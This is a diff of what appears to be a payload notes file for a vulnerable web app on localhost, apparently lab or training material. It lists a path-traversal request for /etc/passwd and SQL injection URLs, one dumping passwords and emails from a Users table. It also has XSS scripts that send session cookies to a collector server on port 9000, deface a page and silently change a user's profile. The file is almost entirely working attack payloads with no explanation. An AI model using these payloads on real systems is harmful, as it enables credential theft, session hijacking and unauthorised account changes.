@@ -10,4 +10,23 @@ LFI
 http://localhost:3000/get-image?imageName=../../../../../etc/passwd
 
 Various SQLi
-//http://localhost:3000/getuser?username=admin%27%20or%20username=%27user%27--%27
+http://localhost:3000/getuser?username=admin%27%20or%20username=%27user%27--%27
+http://localhost:3000/detail?productId=1%20union%20select%20-1,password,%20email,4,5,6%20from%20Users%20order%20by%20productId%20asc
+
+
+XSS
+<img src="/assets/images/bike01.png" width=0 height=0 onload=this.src='http://127.0.0.1:9000/?cookie='+document.cookie>
+<script>document.write('<img src="http://127.0.0.1:9000/collect.gif?cookie=' + document.cookie + '" />')</script>
+<script>document.getElementsByTagName("h2")[0].innerText="Dont buy this bike"</script>
+
+<script>
+//updates user profile
+var formData = new FormData();
+
+formData.append("username", "user");
+formData.append("email", "upateworks@test.com"); 
+
+var request = new XMLHttpRequest();
+request.open("POST", "/user/update-profile");
+request.send(formData);
+</script>
